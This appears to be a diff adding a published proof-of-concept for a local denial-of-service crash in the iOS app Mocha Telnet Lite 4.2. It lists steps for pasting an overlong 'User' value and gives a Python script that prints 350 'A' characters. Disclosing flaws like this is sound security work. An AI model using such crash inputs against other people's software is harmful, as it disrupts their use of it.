@@ -1,0 +1,27 @@
+# Exploit Title: Mocha Telnet Lite for iOS 4.2 - 'User' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2020-08-03
+# Vendor Homepage: https://apps.apple.com/us/app/telnet-lite/id286893976
+# Software Link: App Store for iOS devices
+# Tested Version: 4.2
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: iPhone 7 iOS 13.5.1
+
+# Steps to Produce the Crash:
+# 1.- Run python code: Mocha_Telnet_Lite_for_iOS_4.2.py
+# 2.- Copy content to clipboard
+# 3.- Open "Mocha Telnet Lite for iOS"
+# 4.- Configure
+# 5.- Clic New ... Add a configuration
+# 6.- IP Address > "192.168.1.1"
+# 7.- Paste ClipBoard on "User"
+# 8.- Password > "l4m5"
+# 9.- Clic Back
+# 10.- Click Back
+# 11.- Connect
+# 12.- Crashed
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 350
+print (buffer)
